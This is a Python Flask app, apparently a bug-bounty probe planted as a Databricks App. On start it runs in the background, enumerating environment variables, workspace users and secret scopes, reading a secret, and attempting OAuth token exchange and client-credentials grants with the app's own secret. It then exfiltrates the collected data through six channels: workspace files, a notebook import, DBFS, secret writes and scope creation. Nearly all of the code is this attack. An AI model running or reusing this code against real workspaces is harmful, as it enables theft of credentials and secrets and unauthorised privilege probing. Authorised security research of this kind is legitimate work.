import os, json, time, base64, threading
from databricks.sdk import WorkspaceClient
from flask import Flask, jsonify
import requests as rq

app = Flask(__name__)

ME_HOME = "/Users/m4tr1x4g3nt47+user1@wearehackerone.com"

def env_probe():
    out = {}
    out["env_keys"] = sorted(os.environ.keys())
    for k in ["DATABRICKS_CLIENT_ID", "DATABRICKS_HOST", "DATABRICKS_WORKSPACE_ID"]:
        out[k] = os.environ.get(k, "NOT_SET")
    out["has_client_secret"] = bool(os.environ.get("DATABRICKS_CLIENT_SECRET"))
    try:
        w = WorkspaceClient()
        me = w.current_user.me()
        out["identity"] = {"user": me.user_name, "id": me.id}
    except Exception as e:
        out["identity_err"] = str(e)[:200]
    try:
        out["ws_users"] = [o.path for o in w.workspace.list("/Users")][:20]
    except Exception as e:
        out["ws_users_err"] = str(e)[:150]
    try:
        out["secret_scopes"] = [s.name for s in w.secrets.list_scopes()]
    except Exception as e:
        out["scopes_err"] = str(e)[:150]
    try:
        keys = [k.key for k in w.secrets.list_secrets("h1_test")]
        out["h1_test_keys"] = keys[:10]
        if keys:
            s = w.secrets.get_secret("h1_test", keys[0])
            out["h1_test_read"] = {"ok": True, "value_len": len(s.value) if s.value else 0}
    except Exception as e:
        out["h1_test_err"] = str(e)[:150]
    return out

def obo_probe():
    out = {}
    client_id = os.environ.get("DATABRICKS_CLIENT_ID", "")
    client_secret = os.environ.get("DATABRICKS_CLIENT_SECRET", "")
    host = os.environ.get("DATABRICKS_HOST", "")
    if host and not host.startswith("http"):
        host = "https://" + host
    if not all([client_id, client_secret, host]):
        return {"error": "missing credentials"}
    try:
        r = rq.post(f"{host}/oidc/v1/token", data={
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "client_id": client_id,
            "client_secret": client_secret,
            "subject_token": client_secret,
            "subject_token_type": "urn:ietf:params:oauth:token-type:access_token"
        }, timeout=10)
        out["token_exchange"] = {"status": r.status_code, "body": r.text[:300]}
    except Exception as e:
        out["token_exchange_err"] = str(e)[:150]
    try:
        r = rq.post(f"{host}/oidc/v1/token", data={
            "grant_type": "client_credentials",
            "client_id": client_id,
            "client_secret": client_secret,
            "scope": "allscope"
        }, timeout=10)
        out["client_credentials"] = {"status": r.status_code, "body": r.text[:300]}
        if r.status_code == 200:
            out["cc_token_obtained"] = True
            out["cc_token_head"] = r.json().get("access_token", "")[:25]
    except Exception as e:
        out["cc_err"] = str(e)[:150]
    return out

def get_token():
    host = os.environ.get("DATABRICKS_HOST", "")
    if host and not host.startswith("http"):
        host = "https://" + host
    r = rq.post(f"{host}/oidc/v1/token", data={
        "grant_type": "client_credentials",
        "client_id": os.environ.get("DATABRICKS_CLIENT_ID", ""),
        "client_secret": os.environ.get("DATABRICKS_CLIENT_SECRET", ""),
    }, timeout=10)
    if r.status_code != 200:
        raise RuntimeError(f"token {r.status_code}: {r.text[:200]}")
    return r.json()["access_token"]

def deliver(payload):
    """Exfiltrate probe results over control-plane channels using app creds."""
    delivery = {}
    data = json.dumps(payload, indent=1, default=str)
    try:
        tok = get_token()
        delivery["cc_token"] = "obtained len=%d" % len(tok)
        host = os.environ.get("DATABRICKS_HOST", "")
        if host and not host.startswith("http"):
            host = "https://" + host
        H = {"Authorization": "Bearer " + tok}
        appn = os.environ.get("DATABRICKS_APP_NAME", "h7-env-app")
        b64 = base64.b64encode(data.encode()).decode()
        # channel A: Files API put (workspace file, app dir)
        for p in [f"/Workspace/Applications/{appn}/h7env_results.json",
                  f"/Workspace/Applications/{appn}/h7env_results.txt",
                  ME_HOME + "/h7env_results.json"]:
            try:
                r = rq.put(f"{host}/api/2.0/workspace/files{p}", headers=H,
                           data=data.encode(), params={"overwrite": "true"}, timeout=15)
                delivery["files:" + p] = f"{r.status_code} {r.text[:120]}"
            except Exception as e:
                delivery["files:" + p] = "ERR " + str(e)[:100]
        # channel B: workspace import (notebook)
        try:
            r = rq.post(f"{host}/api/2.0/workspace/import", headers=H, json={
                "path": f"/Workspace/Applications/{appn}/h7env_nb", "format": "SOURCE",
                "language": "PYTHON", "content": b64, "overwrite": True}, timeout=15)
            delivery["ws_import"] = f"{r.status_code} {r.text[:120]}"
        except Exception as e:
            delivery["ws_import"] = "ERR " + str(e)[:100]
        # channel C: dbfs put
        try:
            r = rq.post(f"{host}/api/2.0/dbfs/put", headers=H, json={
                "path": "dbfs:/tmp/h7env_results.json", "content": b64, "overwrite": True}, timeout=15)
            delivery["dbfs_put"] = f"{r.status_code} {r.text[:120]}"
        except Exception as e:
            delivery["dbfs_put"] = "ERR " + str(e)[:100]
        # channel D: secret write into h1_test scope (permission probe)
        try:
            r = rq.post(f"{host}/api/2.0/secrets/put", headers=H, json={
                "scope": "h1_test", "key": "h7env_exfil", "string_value": data[:5000]}, timeout=15)
            delivery["secret_put_h1_test"] = f"{r.status_code} {r.text[:120]}"
        except Exception as e:
            delivery["secret_put_h1_test"] = "ERR " + str(e)[:100]
        # channel E: create its own scope (permission probe)
        try:
            r = rq.post(f"{host}/api/2.0/secrets/scopes/create", headers=H,
                        json={"scope": "h7env_probe_scope"}, timeout=15)
            delivery["scope_create"] = f"{r.status_code} {r.text[:120]}"
        except Exception as e:
            delivery["scope_create"] = "ERR " + str(e)[:100]
        # channel F: write results into operator-managed scope h7exfil (chunked)
        try:
            chunk = 3000
            n = 0
            for i in range(0, len(data), chunk):
                r = rq.post(f"{host}/api/2.0/secrets/put", headers=H, json={
                    "scope": "h7exfil", "key": f"h7env_{n}", "string_value": data[i:i+chunk]}, timeout=15)
                n += 1
            delivery["h7exfil_put"] = f"{r.status_code} chunks={n} {r.text[:120]}"
        except Exception as e:
            delivery["h7exfil_put"] = "ERR " + str(e)[:100]
    except Exception as e:
        delivery["token_err"] = str(e)[:200]
    return delivery

def self_probe():
    time.sleep(8)
    payload = {"probe_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    payload["env_probe"] = env_probe()
    payload["obo_probe"] = obo_probe()
    d1 = deliver(payload)
    payload["delivery_attempt1"] = d1
    # retry write including delivery results
    try:
        tok = get_token()
        host = os.environ.get("DATABRICKS_HOST", "")
        if host and not host.startswith("http"):
            host = "https://" + host
        appn = os.environ.get("DATABRICKS_APP_NAME", "h7-env-app")
        data = json.dumps(payload, indent=1, default=str)
        b64 = base64.b64encode(data.encode()).decode()
        H2 = {"Authorization": "Bearer " + tok}
        r = rq.put(f"{host}/api/2.0/workspace/files/Workspace/Applications/{appn}/h7env_results.json",
                   headers=H2, data=data.encode(),
                   params={"overwrite": "true"}, timeout=15)
        r2 = rq.post(f"{host}/api/2.0/dbfs/put", headers=H2,
                     json={"path": "dbfs:/tmp/h7env_results.json", "content": b64, "overwrite": True},
                     timeout=15)
        chunk = 3000
        n = 0
        for i in range(0, len(data), chunk):
            r3 = rq.post(f"{host}/api/2.0/secrets/put", headers=H2, json={
                "scope": "h7exfil", "key": f"h7env_{n}", "string_value": data[i:i+chunk]}, timeout=15)
            n += 1
        payload["delivery_attempt2"] = {"files": r.status_code, "dbfs": r2.status_code,
                                        "h7exfil": f"{r3.status_code} chunks={n}"}
    except Exception as e:
        payload["delivery_attempt2"] = str(e)[:150]
    print("H7ENV_FINAL " + json.dumps(payload, default=str), flush=True)

threading.Thread(target=self_probe, daemon=True).start()

@app.route("/")
def home():
    return "env-probe ok"

@app.route("/env")
def env():
    return jsonify(env_probe())

@app.route("/obo")
def obo():
    return jsonify(obo_probe())
